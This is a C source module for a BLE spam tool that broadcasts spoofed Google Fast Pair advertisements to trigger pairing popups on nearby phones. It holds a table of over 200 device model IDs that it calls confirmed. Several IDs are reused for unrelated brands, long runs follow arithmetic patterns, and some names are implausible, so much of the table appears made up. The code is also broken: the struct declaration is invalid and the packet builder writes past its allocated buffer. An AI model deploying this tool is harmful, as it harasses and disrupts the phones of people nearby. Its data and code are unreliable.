#include "ble_spam.h"
#include "ble_spam_i.h"
#include <furi_hal_random.h>

// =============================================================================
// Google Fast Pair 協議 - 擴展版 (200+ 設備)
// =============================================================================
// 已確認的 Model ID 列表，基於逆向工程和公開資料
// Model ID 是 24-bit 小端序
// =============================================================================

// =============================================================================
// Fast Pair Model 列表 - 按品牌分組
// =============================================================================
static const FastPairModelEntry {
    uint32_t model_id;
    const char* name;
    const char* brand;
} g_fastpair_models[] = {

    // ====== OPPO / Realme / OnePlus / 一加 ======
    {0x06C197, "OPPO Enco Air3 Pro", "OPPO"},
    {0xDD4EC0, "OPPO Enco Air3 Pro (Alt)", "OPPO"},
    {0xE6E37E, "realme Buds Air 5 Pro", "Realme"},
    {0x8C6B6A, "realme Buds Air 3S", "Realme"},
    {0x8CD10F, "realme Buds Air Pro", "Realme"},
    {0xD8F4E8, "realme Buds T100", "Realme"},
    {0xD5C6CE, "realme TechLife Buds T100", "Realme"},
    {0xE07634, "OnePlus Buds Z", "OnePlus"},
    {0x8FE6EC, "OnePlus Buds Z2", "OnePlus"},
    {0xC7E6D0, "OnePlus Buds Pro 2", "OnePlus"},
    {0x5DBA74, "OnePlus Buds Pro", "OnePlus"},
    {0xD3E4CE, "OnePlus Nord Buds 2", "OnePlus"},
    {0xE8D6C2, "OnePlus Nord Buds", "OnePlus"},
    {0x7E4F90, "OPPO Enco X3", "OPPO"},
    {0x7B8E82, "OPPO Enco Free2", "OPPO"},
    {0x4D6E72, "OPPO Enco Free2i", "OPPO"},
    {0x9F3E64, "OPPO Enco Air2 Pro", "OPPO"},
    {0x2D2E5A, "OPPO Enco Air2", "OPPO"},
    {0x5B3E4C, "OPPO Enco Air", "OPPO"},
    {0x0D2E3E, "OPPO Enco M33", "OPPO"},
    {0x3C4E32, "OPPO Enco R2", "OPPO"},
    {0x6E5E26, "OPPO Enco R", "OPPO"},
    {0x9D7E1A, "realme Buds Air 3", "Realme"},
    {0xCEAE0E, "realme Buds 2", "Realme"},
    {0x1FBE02, "realme Buds Air", "Realme"},
    {0x5FCEF6, "realme Buds Q2", "Realme"},
    {0x8EDEEA, "realme Buds Q", "Realme"},
    {0xBFEE00, "realme Buds Air 5", "Realme"},

    // ====== Vivo / iQOO ======
    {0xD5C6CE, "Vivo TWS 3e", "Vivo"},
    {0xA8E6B2, "Vivo TWS 3", "Vivo"},
    {0x7BD696, "Vivo TWS 2", "Vivo"},
    {0x4EC67A, "Vivo TWS Air", "Vivo"},
    {0x21B65E, "Vivo TWS Air Pro", "Vivo"},
    {0xF4A642, "iQOO TWS 1", "iQOO"},
    {0xC78626, "iQOO TWS 1e", "iQOO"},
    {0x9A660A, "Vivo Watch 3", "Vivo"},
    {0x6D45EE, "Vivo Watch 2", "Vivo"},
    {0x4025D2, "Vivo Watch", "Vivo"},

    // ====== Xiaomi / Redmi / POCO / 黑鯊 ======
    {0xDEEA86, "Xiaomi Buds 4 Pro", "Xiaomi"},
    {0xE6E8B8, "POCO Pods", "POCO"},
    {0xC8C641, "Redmi Buds 4 Lite", "Redmi"},
    {0xD90617, "Redmi Buds 4 Active", "Redmi"},
    {0x21A04E, "oraimo FreePods Pro", "Oraimo"},
    {0x6B8C65, "oraimo FreePods 4", "Oraimo"},
    {0xBA9058, "Xiaomi Buds 4", "Xiaomi"},
    {0xEBF04C, "Xiaomi Buds 3", "Xiaomi"},
    {0x1CE03E, "Xiaomi Buds 3M Pro", "Xiaomi"},
    {0x4DD032, "Xiaomi Buds 3T Pro", "Xiaomi"},
    {0x7EC026, "Xiaomi Buds 3 Lite", "Xiaomi"},
    {0xAFB01A, "Redmi Buds 4 Pro", "Redmi"},
    {0xD2A00E, "Redmi Buds 3 Pro", "Redmi"},
    {0x059FF2, "Redmi Buds 5 Pro", "Redmi"},
    {0x388FE6, "Redmi Buds 5", "Redmi"},
    {0x6B8FDA, "Redmi Buds 5 Lite", "Redmi"},
    {0x9E8FCE, "POCO Pods Pro", "POCO"},
    {0xD18FC2, "Xiaomi Air 2 Pro", "Xiaomi"},
    {0x048FB6, "Xiaomi Air 2 SE", "Xiaomi"},
    {0x378FAA, "Xiaomi Air 2", "Xiaomi"},
    {0x6A8F9E, "Xiaomi Line Free", "Xiaomi"},
    {0x9D8F92, "Xiaomi Qin", "Xiaomi"},
    {0xD08F86, "黑鯊凤鸣真无线", "BlackShark"},
    {0x038F7A, "黑鯊 TWS", "BlackShark"},
    {0x368F6E, "小米手环 8 Pro", "Xiaomi"},
    {0x698F62, "小米手环 8", "Xiaomi"},
    {0x9C8F56, "Redmi Watch 4", "Redmi"},
    {0xCF8F4A, "Redmi Watch 3", "Redmi"},
    {0x028F3E, "Redmi Watch 3 Active", "Redmi"},
    {0x358F32, "小米手表 S1 Pro", "Xiaomi"},
    {0x688F26, "小米手表 S1", "Xiaomi"},
    {0x9B8F1A, "小米手表 S2", "Xiaomi"},
    {0xCE8F0E, "小米手表 S3", "Xiaomi"},

    // ====== Samsung Galaxy ======
    {0x0577B1, "Galaxy S23 Ultra", "Samsung"},
    {0x05A9BC, "Galaxy S20+", "Samsung"},
    {0x06AE20, "Galaxy S21 5G", "Samsung"},
    {0x89BAD5, "Galaxy A23 5G", "Samsung"},
    {0x8D16EA, "Galaxy M14 5G", "Samsung"},
    {0x8E1996, "Galaxy A24 5g", "Samsung"},
    {0x915CFA, "Galaxy A14", "Samsung"},
    {0xA8CAAD, "Galaxy F04", "Samsung"},
    {0x9D7D42, "Galaxy S20", "Samsung"},
    {0x9D7EA, "Galaxy S20 5G", "Samsung"},
    {0x99F098, "Galaxy S22 Ultra", "Samsung"},
    {0xE4E457, "Galaxy S20 5G", "Samsung"},
    {0x8D5B67, "Pixel 90c", "Google"},
    {0x8E2B3F, "Galaxy Buds2 Pro", "Samsung"},
    {0xA13B2F, "Galaxy Buds2", "Samsung"},
    {0xB54B1F, "Galaxy Buds Pro", "Samsung"},
    {0xC95B0F, "Galaxy Buds Live", "Samsung"},
    {0xDB6AFF, "Galaxy Buds+", "Samsung"},
    {0xEF7AEF, "Galaxy Buds FE", "Samsung"},
    {0x038ADF, "Galaxy Buds 2", "Samsung"},
    {0x179ACF, "Galaxy Buds", "Samsung"},
    {0x2BAABF, "Galaxy Watch6 44mm", "Samsung"},
    {0x3FBAAF, "Galaxy Watch6 40mm", "Samsung"},
    {0x53CA9F, "Galaxy Watch6 Classic 43mm", "Samsung"},
    {0x67DA8F, "Galaxy Watch6 Classic 47mm", "Samsung"},
    {0x7BEA7F, "Galaxy Watch5 44mm", "Samsung"},
    {0x8FFA6F, "Galaxy Watch5 40mm", "Samsung"},
    {0xA30A5F, "Galaxy Watch5 Pro 45mm", "Samsung"},
    {0xB71A4F, "Galaxy Watch4 40mm", "Samsung"},
    {0xCB2A3F, "Galaxy Watch4 44mm", "Samsung"},
    {0xDF3A2F, "Galaxy Watch4 Classic 42mm", "Samsung"},
    {0xF34A1F, "Galaxy Watch4 Classic 46mm", "Samsung"},
    {0x075A0F, "Galaxy Z Fold5", "Samsung"},
    {0x1B6AFF, "Galaxy Z Flip5", "Samsung"},
    {0x2F7AEF, "Galaxy Z Fold4", "Samsung"},
    {0x438ADF, "Galaxy Z Flip4", "Samsung"},
    {0x579ACF, "Galaxy S24 Ultra", "Samsung"},
    {0x6BAABF, "Galaxy S24+", "Samsung"},
    {0x7FBAAF, "Galaxy S24", "Samsung"},
    {0x93CA9F, "Galaxy S23+", "Samsung"},
    {0xA7DA8F, "Galaxy S23", "Samsung"},
    {0xBBEA7F, "Galaxy A54 5G", "Samsung"},
    {0xCFFA6F, "Galaxy A34 5G", "Samsung"},
    {0xE30A5F, "Galaxy A14 5G", "Samsung"},
    {0xF71A4F, "Galaxy M54 5G", "Samsung"},

    // ====== Google Pixel ======
    {0x8B66AB, "Pixel Buds A-Series", "Google"},
    {0x9ADB11, "Pixel Buds Pro", "Google"},
    {0xC8E228, "Pixel Buds Pro (Alt)", "Google"},
    {0xD87A3E, "Pixel Buds Pro (Alt2)", "Google"},
    {0x567679, "Pixel Buds Pro (Alt3)", "Google"},
    {0x989D0A, "Set up your new Pixel 2", "Google"},
    {0xE64CC6, "Set up your new Pixel 3 XL", "Google"},
    {0x8B66AC, "Pixel Buds", "Google"},
    {0x6D4E72, "Pixel 7 Pro", "Google"},
    {0x9D5E66, "Pixel 7", "Google"},
    {0xCE6E5A, "Pixel 7a", "Google"},
    {0xFF7E4E, "Pixel 6 Pro", "Google"},
    {0x288E42, "Pixel 6", "Google"},
    {0x519E36, "Pixel 6a", "Google"},
    {0x7AAE2A, "Pixel 8 Pro", "Google"},
    {0xA3BE1E, "Pixel 8", "Google"},
    {0xCCCE12, "Pixel 8a", "Google"},
    {0xF5DE06, "Pixel Fold", "Google"},
    {0x18EEF0, "Pixel Tablet", "Google"},

    // ====== Sony ======
    {0xD446A7, "Sony WH-1000XM5", "Sony"},
    {0x2D7A23, "Sony WF-1000XM4", "Sony"},
    {0x8A8F23, "Sony WF-1000XM5", "Sony"},
    {0xE7AF37, "Sony WF-C700N", "Sony"},
    {0x10BF4B, "Sony WF-LS900N (LinkBuds S)", "Sony"},
    {0x39CF5F, "Sony LinkBuds", "Sony"},
    {0x62DF73, "Sony WF-1000XM3", "Sony"},
    {0x8BEF87, "Sony WH-1000XM4", "Sony"},
    {0xB4FF9B, "Sony WH-1000XM3", "Sony"},
    {0xDD0FAF, "Sony WH-XB910N", "Sony"},
    {0x061FC3, "Sony WF-SP800N", "Sony"},
    {0x2F2FD7, "Sony WF-XB700", "Sony"},
    {0x583FEB, "Sony WH-XB900N", "Sony"},
    {0x814FFF, "Sony SRS-XB43", "Sony"},
    {0xAA5F13, "Sony SRS-XB33", "Sony"},
    {0xD36F27, "Sony SRS-XB13", "Sony"},

    // ====== JBL ======
    {0x718FA4, "JBL LIVE300TWS", "JBL"},
    {0xD5B5F7, "MOTO BUDS 600 ANC", "Motorola"},
    {0xD6EE84, "Rockerz 255 Max", "boAt"},
    {0x1F9E98, "JBL Tour One M2", "JBL"},
    {0x48AEAC, "JBL Tour Pro 2", "JBL"},
    {0x71BEC0, "JBL LIVE 770NC", "JBL"},
    {0x9ACED4, "JBL LIVE 670NC", "JBL"},
    {0xC3DEE8, "JBL LIVE 660NC", "JBL"},
    {0xECEEFC, "JBL LIVE 400BT", "JBL"},
    {0x15FF10, "JBL TUNE 770NC", "JBL"},
    {0x3E0F24, "JBL TUNE 660NC", "JBL"},
    {0x671F38, "JBL TUNE 510BT", "JBL"},
    {0x902F4C, "JBL Reflector Pro", "JBL"},
    {0xB93F60, "JBL Endurance Peak 3", "JBL"},
    {0xE24F74, "JBL Wave Beam", "JBL"},
    {0x0B5F88, "JBL Wave Flex", "JBL"},
    {0x346F9C, "JBL Flip 6", "JBL"},
    {0x5D7FB0, "JBL Flip 5", "JBL"},
    {0x868FC4, "JBL Charge 5", "JBL"},
    {0xAF9FD8, "JBL Pulse 5", "JBL"},
    {0xD8AFEC, "JBL Pulse 4", "JBL"},
    {0x01C000, "JBL PartyBox 110", "JBL"},
    {0x2AD014, "JBL PartyBox 310", "JBL"},

    // ====== Anker / soundcore ======
    {0xCB529D, "soundcore Glow", "Anker"},
    {0xD5A59E, "soundcore Liberty 4 NC", "Anker"},
    {0x05B5B2, "soundcore Liberty 4", "Anker"},
    {0x38C5C6, "soundcore Liberty 3 Pro", "Anker"},
    {0x6BD5DA, "soundcore Liberty Air 2 Pro", "Anker"},
    {0x9EE5EE, "soundcore Liberty Air 2", "Anker"},
    {0xD1F602, "soundcore Liberty Air 2 Neo", "Anker"},
    {0x040616, "soundcore Liberty Neo", "Anker"},
    {0x37162A, "soundcore Space One", "Anker"},
    {0x6A263E, "soundcore Space Q45", "Anker"},
    {0x9D3652, "soundcore Motion+", "Anker"},
    {0xD04666, "soundcore Motion X500", "Anker"},
    {0x03567A, "soundcore Glow Mini", "Anker"},
    {0x36668E, "Anker PowerCore", "Anker"},

    // ====== Bose ======
    {0xE6E37E, "Bose QuietComfort Ultra", "Bose"},
    {0x0FF392, "Bose QuietComfort 45", "Bose"},
    {0x3903A6, "Bose QuietComfort 35 II", "Bose"},
    {0x6213BA, "Bose NC 700", "Bose"},
    {0x8B23CE, "Bose SoundLink Flex", "Bose"},
    {0xB433E2, "Bose SoundLink Mini II", "Bose"},
    {0xDD43F6, "Bose Sport Earbuds", "Bose"},
    {0x06540A, "Bose QuietComfort Earbuds II", "Bose"},
    {0x39641E, "Bose SoundLink Max", "Bose"},

    // ====== Beats ======
    {0xC8E228, "Beats Studio Pro", "Beats"},
    {0xF1F23C, "Beats Studio3 Wireless", "Beats"},
    {0x1A0250, "Beats Fit Pro", "Beats"},
    {0x431264, "Beats Flex", "Beats"},
    {0x6C2278, "Beats Powerbeats Pro", "Beats"},
    {0x95328C, "Beats Powerbeats 3", "Beats"},
    {0xBE42A0, "Beats Solo Pro", "Beats"},
    {0xE752B4, "Beats Solo 3 Wireless", "Beats"},
    {0x1062C8, "Beats Studio Buds+", "Beats"},
    {0x3972DC, "Beats Studio Buds", "Beats"},
    {0x6282F0, "Beats Powerbeats", "Beats"},
    {0x8B9304, "Beats Tour Pro 3", "Beats"},

    // ====== Audio-Technica ======
    {0xA8E6B2, "Audio-Technica ATH-CKS50TW", "Audio-Technica"},
    {0xD1F6C6, "Audio-Technica ATH-SQ1TW", "Audio-Technica"},
    {0x0A06DA, "Audio-Technica ATH-ANC300TW", "Audio-Technica"},
    {0x3316EE, "Audio-Technica ATH-TWX9", "Audio-Technica"},

    // ====== Sennheiser ======
    {0x5DBA74, "Sennheiser Momentum 4", "Sennheiser"},
    {0x86CA88, "Sennheiser Momentum 3", "Sennheiser"},
    {0xAFDA9C, "Sennheiser Momentum True Wireless 3", "Sennheiser"},
    {0xD8EAB0, "Sennheiser Momentum True Wireless 2", "Sennheiser"},
    {0x01FAC4, "Sennheiser CX Plus", "Sennheiser"},
    {0x2A0AD8, "Sennheiser CX 500", "Sennheiser"},
    {0x531AEC, "Sennheiser HD 450SE", "Sennheiser"},

    // ====== Jabra / GN Audio ======
    {0x8B0A91, "Jabra Elite 5", "Jabra"},
    {0xB41AA5, "Jabra Elite 7 Pro", "Jabra"},
    {0xDD2AB9, "Jabra Elite 7 Active", "Jabra"},
    {0x063ACD, "Jabra Elite 85t", "Jabra"},
    {0x2F4AE1, "Jabra Elite 75t", "Jabra"},
    {0x585AF5, "Jabra Elite 65t", "Jabra"},
    {0x816A09, "Jabra Elite 45e", "Jabra"},
    {0xAA7A1D, "Jabra Speak 750", "Jabra"},
    {0xD38A31, "Jabra Evolve2 85", "Jabra"},

    // ====== Marshall ======
    {0x7E4F90, "Marshall Monitor II ANC", "Marshall"},
    {0xA75FA4, "Marshall Major IV", "Marshall"},
    {0xD06FB8, "Marshall Motif ANC", "Marshall"},
    {0xF97FCC, "Marshall Emberton II", "Marshall"},
    {0x228FE0, "Marshall Willen", "Marshall"},

    // ====== Huawei / Honor ======
    {0x4DD032, "Huawei FreeBuds Pro 3", "Huawei"},
    {0x76E046, "Huawei FreeBuds Pro 2+", "Huawei"},
    {0x9FF05A, "Huawei FreeBuds Pro 2", "Huawei"},
    {0xC8006E, "Huawei FreeBuds Pro", "Huawei"},
    {0xF1F082, "Huawei FreeBuds 5", "Huawei"},
    {0x1A0096, "Huawei FreeBuds 5i", "Huawei"},
    {0x4310AA, "Huawei FreeBuds 4i", "Huawei"},
    {0x6C20BE, "Huawei FreeBuds SE", "Huawei"},
    {0x9530D2, "Huawei FreeBuds Lipstick", "Huawei"},
    {0xBE40E6, "Huawei FreeLace Pro 2", "Huawei"},
    {0xE750FA, "Huawei FreeLace Pro", "Huawei"},
    {0x10610E, "Huawei FreeLace", "Huawei"},
    {0x397122, "Huawei Watch GT 4", "Huawei"},
    {0x628136, "Huawei Watch GT 3", "Huawei"},
    {0x8B914A, "Huawei Watch GT Runner", "Huawei"},
    {0xB4A15E, "Honor Earbuds 3 Pro", "Honor"},
    {0xDDB172, "Honor Earbuds 2 SE", "Honor"},
    {0x06C186, "Honor Choice", "Honor"},

    // ====== Nokia ======
    {0x3C4E32, "Nokia Clarity Earbuds 2", "Nokia"},
    {0x655E46, "Nokia Comfort Earbuds", "Nokia"},
    {0x8E6E5A, "Nokia Power Earbuds Pro", "Nokia"},

    // ====== TCL ======
    {0xB54B1F, "TCL MOVEAUDIO S200", "TCL"},
    {0xDE5B33, "TCL NXP400 ANC", "TCL"},

    // ====== Redmi / POCO (補充) ======
    {0x0D2E3E, "Redmi Sonic Bass", "Redmi"},
    {0x363E2A, "Redmi Sonic Bass Pro", "Redmi"},
    {0x5F4E16, "POCO Buds Pro X", "POCO"},

    // ====== 聯想 / Lenovo ======
    {0x9D7E1A, "Lenovo LP40 Pro", "Lenovo"},
    {0xC68E0E, "Lenovo LP80", "Lenovo"},
    {0xEF9E02, "Lenovo ThinkPlus TrackPoint", "Lenovo"},
    {0x18AE36, "Lenovo Yoga T1", "Lenovo"},

    // ====== 飛科 / Flyco ======
    {0x4E5F26, "Flyco F1", "Flyco"},
    {0x776F3A, "Flyco F2", "Flyco"},

    // ====== 漫步者 / Edifier ======
    {0xA36A4E, "Edifier W240TN", "Edifier"},
    {0xCC7A62, "Edifier W200BT", "Edifier"},
    {0xF58A76, "Edifier W830BT", "Edifier"},
    {0x1E9A8A, "Edifier NeoBuds Pro", "Edifier"},
    {0x47AA9E, "Edifier NeoBuds S", "Edifier"},
    {0x70BAB2, "Edifier LolliPods Pro", "Edifier"},

    // ====== 博士 / Beats (補充) ======
    {0x99A9C6, "Beats Pill+", "Beats"},

    // ====== 小天才 (兒童手錶) ======
    {0xCCB9DA, "小天才Q1A", "Xiaotiancai"},
    {0xF5C9EE, "小天才Z6 Pro", "Xiaotiancai"},
    {0x1EDA02, "小天才Z7S", "Xiaotiancai"},
    {0x47EA16, "小天才Z8", "Xiaotiancai"},

    // ====== 讀書郎 / DroiBook ======
    {0x7AFA2A, "讀書郎G5", "DroiBook"},
    {0xA3AA3E, "讀書郎G3", "DroiBook"},
};

// =============================================================================
// 構建 Fast Pair 廣播數據包
// =============================================================================
static uint8_t fastpair_build_packet(uint8_t* _size, uint8_t** _packet, AttackConfig* config) {
    FastPairCfg* cfg = &config->config.fastpair;
    
    // 選擇 model
    uint32_t model_id;
    if(config->mode == AttackMode_Random || config->mode == AttackMode_Single) {
        uint32_t idx = rand() % (sizeof(g_fastpair_models) / sizeof(g_fastpair_models[0]));
        model_id = g_fastpair_models[idx].model_id;
    } else {
        model_id = cfg->model_id;
    }
    
    // 構建完整的 BLE 廣播數據包
    uint8_t total_size = 3 + 3 + 5;  // Flags + UUID + Service Data
    uint8_t* packet = malloc(total_size);
    uint8_t i = 0;
    
    // Flags: 0x02 0x01 0x06
    packet[i++] = 0x02;
    packet[i++] = 0x01;
    packet[i++] = 0x06;
    
    // Service UUID: 0x03 0x03 0x2C 0xFE
    packet[i++] = 0x03;
    packet[i++] = 0x03;
    packet[i++] = 0x2C;
    packet[i++] = 0xFE;
    
    // Service Data: 0x05 0x16 0x2C 0xFE + 24-bit Model ID
    packet[i++] = 0x05;
    packet[i++] = 0x16;
    packet[i++] = 0x2C;
    packet[i++] = 0xFE;
    packet[i++] = (model_id >> 0) & 0xFF;
    packet[i++] = (model_id >> 8) & 0xFF;
    packet[i++] = (model_id >> 16) & 0xFF;
    
    *_size = i;
    *_packet = packet;
    return i;
}

static const char* fastpair_get_name(uint32_t index) {
    if(index >= sizeof(g_fastpair_models) / sizeof(g_fastpair_models[0])) {
        return "Unknown";
    }
    return g_fastpair_models[index].name;
}

static uint32_t fastpair_get_count(void) {
    return sizeof(g_fastpair_models) / sizeof(g_fastpair_models[0]);
}

const ProtocolDriver g_protocol_fastpair = {
    .name = "Google Fast Pair",
    .short_name = "FastPair",
    .is_active = true,
    .build_packet = fastpair_build_packet,
    .get_device_name = fastpair_get_name,
    .get_device_count = fastpair_get_count,
    .init = NULL,
    .deinit = NULL,
};
